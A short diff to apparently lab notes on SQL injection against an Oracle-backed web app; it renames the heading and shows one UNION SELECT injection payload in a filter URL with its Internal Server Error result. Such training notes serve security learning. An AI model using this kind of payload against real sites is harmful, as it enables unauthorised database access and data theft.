@@ -1,4 +1,4 @@
-# lab-querying-database-version-oracle
+# Querying database version on Oracle
 
 `/filter?category=Pets'+UNION+SELECT+NULL+FROM+dual--`: Internal Server Error
 
